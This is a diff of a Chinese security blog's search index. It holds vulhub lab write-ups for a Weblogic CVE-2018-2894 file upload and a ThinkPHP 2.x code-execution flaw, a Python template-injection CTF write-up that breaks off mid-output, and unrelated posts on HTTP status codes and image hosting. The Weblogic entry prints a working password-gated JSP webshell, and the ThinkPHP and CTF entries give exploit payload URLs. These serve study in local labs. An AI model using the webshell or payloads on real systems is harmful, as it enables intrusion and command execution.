+<td align="left">由于临时的服务器维护或者过载,服务器当前无法处理请求.这个状况是临时的,并且将在一段时间以后恢复.如果能够预计延迟时间,那么响应中可以包含一个<code>Retry-After:</code>头用以标明这个延迟时间.如果没有给出这个<code>Retry-After:</code>信息，那么客户端应当以处理500响应的方式处理它.同时,这种情况下,一个友好的用于解释服务器出现问题的页面应当被返回,并且,缓存相关的HTTP头信息也应该包含,因为通常这种错误提示网页不应当被客户端缓存.</td>
+<td align="left">HTTP&#x2F;0.9 可用</td>
+</tr>
+<tr>
+<td align="center">504</td>
+<td align="left">Gateway Timeout (网关超时)</td>
+<td align="left">服务器作为网关且不能从上游服务器及时的得到响应返回给客户端.</td>
+<td align="left">HTTP&#x2F;1.1 可用</td>
+</tr>
+<tr>
+<td align="center">505</td>
+<td align="left">HTTP Version Not Supported (HTTP版本不受支持)</td>
+<td align="left">服务器不支持客户端发送的HTTP请求中所使用的HTTP协议版本.</td>
+<td align="left">HTTP&#x2F;1.1 可用</td>
+</tr>
+</tbody></table>
+]]></content>
+      <categories>
+        <category>杂项</category>
+      </categories>
+      <tags>
+        <tag>Http</tag>
+        <tag>状态码</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Weblogic 任意文件上传漏洞（CVE-2018-2894）</title>
+    <url>/2023/11/11/Weblogic-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-2894%EF%BC%89/</url>
+    <content><![CDATA[<h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><p><strong>漏洞环境：Weblogic 任意文件上传漏洞（CVE-2018-2894）</strong></p>
+<ol>
+<li>复现环境中的任意文件上传漏洞，截图证明</li>
+<li>上传WebShell（或反弹shell），并通过WebShell （或反弹shell）执行whoami命令，提供截图</li>
+</ol>
+<h2 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h2><p>进入<code>/vulhub/weblogic/CVE-2018-2894</code>目录下，终端输入<code>docker-compose up -d</code>开启靶场容器</p>
+<p>浏览器访问<code>Your-ip:7001/console</code>即可看到后台登录页面</p>
+<img src="https://images.gaifagafin.top/202311112128112.png" style="zoom:67%;" />
+
+<p>执行<code>docker-compose logs | grep password</code>可查看管理员密码，管理员用户名为<code>weblogic</code>。</p>
+<img src="https://images.gaifagafin.top/202311112128042.png" style="zoom: 80%;" />
+
+<p>登录后台页面，点击<code>base_domain</code>的配置，在“高级”中开启“启用 Web 服务测试页”选项：</p>
+<img src="https://images.gaifagafin.top/202311112128891.png" style="zoom:67%;" />
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问<code>http://your-ip:7001/ws_utc/config.do</code></p>
+<p>设置Work Home Dir为</p>
+<p><code>/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</code></p>
+<p>我将目录设置为<code>ws_utc</code>应用的静态文件css目录，访问这个目录是无需权限的，这一点很重要。</p>
+<img src="https://images.gaifagafin.top/202311112128176.png" style="zoom:67%;" />
+
+<p>然后点击安全 -&gt; 增加，然后上传webshell：</p>
+<p><img src="https://images.gaifagafin.top/202311112128248.png"></p>
+<p>这里用burpsuite转发包到repeater再转发，查看返回的数据包，其中有时间戳，如果之前上传了多个shell脚本，选择最下面的一个时间戳</p>
+<img src="https://images.gaifagafin.top/202311112128015.png" style="zoom:67%;" />
+
+<p>然后访问使用另一个浏览器访问</p>
+<p><code>http://your-ip:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]?pwd=123&amp;cmd=ls</code></p>
+<p>即可执行ls命令查看当前目录：</p>
+<img src="https://images.gaifagafin.top/202311112128725.png" style="zoom:67%;" />
+
+<h2 id="执行whoami命令"><a href="#执行whoami命令" class="headerlink" title="执行whoami命令"></a>执行whoami命令</h2><p>浏览器输入<code>http://192.168.52.130:7001/ws_utc/css/config/keystore/1699702415808_shell.jsp?pwd=123&amp;cmd=whoami</code></p>
+<p>得到whoami回显<code>oracle</code></p>
+<img src="https://images.gaifagafin.top/202311112128942.png" style="zoom:67%;" />
+
+<p>这里贴出我使用的的木马</p>
+<figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%<br>    <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;123&quot;</span>.equals(request.getParameter(<span class="hljs-string">&quot;pwd&quot;</span>)))&#123;<br>        java.io.<span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)).getInputStream();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<br>        <span class="hljs-type">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">2048</span>];<br>        out.print(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);<br>        <span class="hljs-keyword">while</span>((a=in.read(b))!=-<span class="hljs-number">1</span>)&#123;<br>            out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(b));<br>        &#125;<br>        out.print(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>vulhub</category>
+      </categories>
+      <tags>
+        <tag>vulhub</tag>
+        <tag>漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>SQL注入基础</title>
     <url>/2023/10/29/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/</url>
     <content><![CDATA[<p>转载自：<a href="https://www.anquanke.com/post/id/205376">SQL注入基础整理及Tricks总结-安全客 - 安全资讯平台 (anquanke.com)</a></p>
@@ -1757,91 +1696,6 @@
       </tags>
   </entry>
   <entry>
-    <title>ThinkPHP 2.x 任意代码执行漏洞</title>
-    <url>/2023/11/11/ThinkPHP-2-x-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><p><strong>漏洞环境：ThinkPHP 2.x 任意代码执行漏洞</strong></p>
-<ol>
-<li>复现环境中的代码执行漏洞，截图证明</li>
-<li>尝试利用代码执行漏洞读取服务器Web目录下的文件列表，提供截图</li>
-</ol>
-<h2 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h2><p>进入<code>/vulhub/thinkphp/2-rce</code>目录下，终端输入<code>docker-compose up -d</code>开启靶场容器，这里我将虚拟机5006端口映射到容器80端口，浏览器访问5006端口</p>
-<img src="https://images.gaifagafin.top/202311112126159.png" style="zoom:67%;" />
-
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>直接访问<code>http://your-ip:8080/index.php?s=/index/index/name/$%7B@phpinfo()%7D</code></p>
-<p>即可执行<code>phpinfo()</code></p>
-<img src="https://images.gaifagafin.top/202311112126268.png" style="zoom:67%;" />
-
-<h2 id="读取服务器Web目录下的文件列表"><a href="#读取服务器Web目录下的文件列表" class="headerlink" title="读取服务器Web目录下的文件列表"></a>读取服务器Web目录下的文件列表</h2><p>根据上面漏洞复现，要想读取文件列表，首先想到system()函数，于是构造<code>http://192.168.52.130:5006/index.php?s=%2findex%2findex%2fname%2f$%7B@system(%22ls%22)%7D</code></p>
-<p>但是这里单引号双引号都被过滤了</p>
-<img src="https://images.gaifagafin.top/202311112126372.png" style="zoom:67%;" />
-
-<p>这是时想到PHP还有<code>var_dump()</code>函数，并且反引号似乎不会被过滤，于是构造payload：</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http">http://192.168.52.130:5006/index.php?s=/index/index/name/$%7B@var_dump(%60ls%60)%7D%20<br></code></pre></td></tr></table></figure>
-
-<p>得到文件列表</p>
-<p><img src="https://images.gaifagafin.top/202311112126522.png"></p>
-<p>进入容器验证</p>
-<img src="https://images.gaifagafin.top/202311112126245.png" style="zoom: 80%;" />
-]]></content>
-      <categories>
-        <category>vulhub</category>
-      </categories>
-      <tags>
-        <tag>vulhub</tag>
-        <tag>漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Weblogic 任意文件上传漏洞（CVE-2018-2894）</title>
-    <url>/2023/11/11/Weblogic-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-2894%EF%BC%89/</url>
-    <content><![CDATA[<h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><p><strong>漏洞环境：Weblogic 任意文件上传漏洞（CVE-2018-2894）</strong></p>
-<ol>
-<li>复现环境中的任意文件上传漏洞，截图证明</li>
-<li>上传WebShell（或反弹shell），并通过WebShell （或反弹shell）执行whoami命令，提供截图</li>
-</ol>
-<h2 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h2><p>进入<code>/vulhub/weblogic/CVE-2018-2894</code>目录下，终端输入<code>docker-compose up -d</code>开启靶场容器</p>
-<p>浏览器访问<code>Your-ip:7001/console</code>即可看到后台登录页面</p>
-<img src="https://images.gaifagafin.top/202311112128112.png" style="zoom:67%;" />
-
-<p>执行<code>docker-compose logs | grep password</code>可查看管理员密码，管理员用户名为<code>weblogic</code>。</p>
-<img src="https://images.gaifagafin.top/202311112128042.png" style="zoom: 80%;" />
-
-<p>登录后台页面，点击<code>base_domain</code>的配置，在“高级”中开启“启用 Web 服务测试页”选项：</p>
-<img src="https://images.gaifagafin.top/202311112128891.png" style="zoom:67%;" />
-
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问<code>http://your-ip:7001/ws_utc/config.do</code></p>
-<p>设置Work Home Dir为</p>
-<p><code>/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</code></p>
-<p>我将目录设置为<code>ws_utc</code>应用的静态文件css目录，访问这个目录是无需权限的，这一点很重要。</p>
-<img src="https://images.gaifagafin.top/202311112128176.png" style="zoom:67%;" />
-
-<p>然后点击安全 -&gt; 增加，然后上传webshell：</p>
-<p><img src="https://images.gaifagafin.top/202311112128248.png"></p>
-<p>这里用burpsuite转发包到repeater再转发，查看返回的数据包，其中有时间戳，如果之前上传了多个shell脚本，选择最下面的一个时间戳</p>
-<img src="https://images.gaifagafin.top/202311112128015.png" style="zoom:67%;" />
-
-<p>然后访问使用另一个浏览器访问</p>
-<p><code>http://your-ip:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]?pwd=123&amp;cmd=ls</code></p>
-<p>即可执行ls命令查看当前目录：</p>
-<img src="https://images.gaifagafin.top/202311112128725.png" style="zoom:67%;" />
-
-<h2 id="执行whoami命令"><a href="#执行whoami命令" class="headerlink" title="执行whoami命令"></a>执行whoami命令</h2><p>浏览器输入<code>http://192.168.52.130:7001/ws_utc/css/config/keystore/1699702415808_shell.jsp?pwd=123&amp;cmd=whoami</code></p>
-<p>得到whoami回显<code>oracle</code></p>
-<img src="https://images.gaifagafin.top/202311112128942.png" style="zoom:67%;" />
-
-<p>这里贴出我使用的的木马</p>
-<figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%<br>    <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;123&quot;</span>.equals(request.getParameter(<span class="hljs-string">&quot;pwd&quot;</span>)))&#123;<br>        java.io.<span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)).getInputStream();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<br>        <span class="hljs-type">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">2048</span>];<br>        out.print(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);<br>        <span class="hljs-keyword">while</span>((a=in.read(b))!=-<span class="hljs-number">1</span>)&#123;<br>            out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(b));<br>        &#125;<br>        out.print(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>vulhub</category>
-      </categories>
-      <tags>
-        <tag>vulhub</tag>
-        <tag>漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ecShop漏洞复现</title>
     <url>/2023/11/08/ecShop%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<h1 id="ecShop漏洞复现-2-X-3-X-4-X"><a href="#ecShop漏洞复现-2-X-3-X-4-X" class="headerlink" title="ecShop漏洞复现(2.X,3.X,4.X)"></a>ecShop漏洞复现(2.X,3.X,4.X)</h1><h2 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h2><p>进入漏洞文件目录，输入<code>docker-compose up -d </code></p>
@@ -1959,6 +1813,103 @@
       </categories>
       <tags>
         <tag>Webshell扫描</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>关于建站</title>
+    <url>/2023/11/05/%E5%85%B3%E4%BA%8E%E5%BB%BA%E7%AB%99/</url>
+    <content><![CDATA[<p>作为学生党，搭建博客的时候最优先考虑的就是钱，为了搭建一个性价比最高的博客，我尝试了很多图床</p>
+<p>免费的但不完全免费的聚合图床，路过图床，ImgUrl，SM.MS…</p>
+<p>使用cloudflare R2搭建图床:<a href="https://testerhome.com/topics/36077">https://testerhome.com/topics/36077</a></p>
+<p>使用cloudflare+backblaze_b2搭建图床:<a href="https://blog.ostdb.info/54300/#%E5%89%8D%E8%A8%80">https://blog.ostdb.info/54300/#%E5%89%8D%E8%A8%80</a></p>
+<p>最终还是选用cloudflare R2，因为它对于浏览量不高的个人博主来说确实是纯纯白嫖了</p>
+]]></content>
+      <categories>
+        <category>杂项</category>
+      </categories>
+      <tags>
+        <tag>建站</tag>
+        <tag>图床</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>图床图片测试</title>
+    <url>/2023/10/29/%E5%9B%BE%E5%BA%8A%E5%9B%BE%E7%89%87%E6%B5%8B%E8%AF%95/</url>
+    <content><![CDATA[<p><img src="https://s2.loli.net/2023/10/29/vjYu7sqMi8dgQbK.jpg" alt="SM.MS"></p>
+<p><img src="https://s2.loli.net/2023/10/29/Hns3KL4TP2qQm9f.jpg" alt="SM.MS"></p>
+<p><img src="https://s3.uuu.ovh/imgs/2023/11/02/e9d94fc61d21d30a.jpg" alt="ImgUrl"></p>
+<p><img src="https://img.gaifagafin.top/202311041048278.jpg" alt="CloudFlare R2"></p>
+<p><img src="https://images.gaifagafin.top/202311051019789.jpg" alt="cloudflare R2"></p>
+<p><img src="https://images.gaifagafin.top/202311051020956.png" alt="cloudflare R2"></p>
+<p><img src="https://img.gaifagafin.top/wallhaven-3z2k6y.jpg" alt="backbazeb2 8.8MB"></p>
+<p><img src="https://img.gaifagafin.top/wallhaven-72eq5o.jpg" alt="backbazeb2 7.7MB"></p>
+<p><img src="https://img.gaifagafin.top/gaifagafin.jpg" alt="backbazeb2 189KB"></p>
+<p>视频插入测试，代码为：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;position: relative; width: 100%; height: 0; padding-bottom: 75%;&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> </span><br><span class="hljs-tag"><span class="hljs-attr">src</span>=<span class="hljs-string">&quot;//player.bilibili.com/player.html?aid=534928147&amp;bvid=BV1dM41197wb&amp;cid=1307621987&amp;p=1&quot;</span>  <span class="hljs-attr">scrolling</span>=<span class="hljs-string">&quot;no&quot;</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;0&quot;</span> </span><br><span class="hljs-tag"><span class="hljs-attr">frameborder</span>=<span class="hljs-string">&quot;no&quot;</span> <span class="hljs-attr">framespacing</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">allowfullscreen</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;position: absolute; width: 100%; </span></span><br><span class="hljs-string"><span class="hljs-tag">height: 100%; left: 0; top: 0;&quot;</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;"><iframe 
+src="//player.bilibili.com/player.html?aid=534928147&bvid=BV1dM41197wb&cid=1307621987&p=1"  scrolling="no" border="0" 
+frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; 
+height: 100%; left: 0; top: 0;"> </iframe></div>
+
+]]></content>
+      <categories>
+        <category>杂项</category>
+      </categories>
+      <tags>
+        <tag>picture</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>攻防世界-Web_python_template_injection</title>
+    <url>/2023/10/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-python-template-injection/</url>
+    <content><![CDATA[<p>第一次做模板注入的题目，参考H师傅的writeup <a href="https://blog.csdn.net/Mr_helloword/article/details/107949217">https://blog.csdn.net/Mr_helloword/article/details/107949217</a></p>
+<img src="https://images.gaifagafin.top/202311051131161.png" style="zoom:67%;" />
+
+<p>进入靶机网址提示</p>
+<figure class="highlight arduino"><table><tr><td class="code"><pre><code class="hljs arduino">python <span class="hljs-keyword">template</span> injection<br></code></pre></td></tr></table></figure>
+
+<p>知道这是一道python模板注入</p>
+<p>url输入 </p>
+<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http">http://61.147.171.105:50859/&#123;&#123;7*7&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>页面回显</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http">http://61.147.171.105:50859/49 not found<br></code></pre></td></tr></table></figure>
+
+<p>判断存在SSTI注入</p>
+<p>查看网站模块，url输入</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http">http://61.147.171.105:50859/&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>回显</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">URL http://<span class="hljs-number">61.147</span><span class="hljs-number">.171</span><span class="hljs-number">.105</span>:<span class="hljs-number">50859</span>/[&lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;type&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;weakref&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;weakcallableproxy&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;weakproxy&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;int&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;basestring&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;bytearray&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;list&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;NoneType&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;NotImplementedType&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;traceback&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;super&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;xrange&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dict&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;set&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;slice&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;staticmethod&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;complex&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;float&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;buffer&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;long&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;frozenset&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;property&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;memoryview&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;tuple&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;enumerate&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;reversed&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;code&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;frame&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;builtin_function_or_method&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;instancemethod&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;function&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;classobj&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dictproxy&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;generator&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;getset_descriptor&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;wrapper_descriptor&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;instance&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;ellipsis&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;member_descriptor&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;file&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;PyCapsule&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;cell&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;callable-iterator&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;iterator&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;sys.long_info&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;sys.float_info&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;EncodingMap&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;fieldnameiterator&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;formatteriterator&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;sys.version_info&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;sys.flags&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;exceptions.BaseException&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;module&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;imp.NullImporter&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;zipimport.zipimporter&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;posix.stat_result&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;posix.statvfs_result&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;warnings.WarningMessage&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;warnings.catch_warnings&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_weakrefset._IterationGuard&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_weakrefset.WeakSet&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Hashable&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;classmethod&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Iterable&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Sized&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Container&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Callable&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dict_keys&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dict_items&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dict_values&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;site._Printer&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;site._Helper&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_sre.SRE_Pattern&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_sre.SRE_Match&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_sre.SRE_Scanner&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;site.Quitter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;functools.partial&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;operator.itemgetter&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;operator.attrgetter&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;operator.methodcaller&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;collections.deque&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;deque_iterator&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;deque_reverse_iterator&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.combinations&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.combinations_with_replacement&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.cycle&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.dropwhile&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.takewhile&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.islice&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.starmap&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.imap&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.chain&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.compress&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.ifilter&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.ifilterfalse&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span 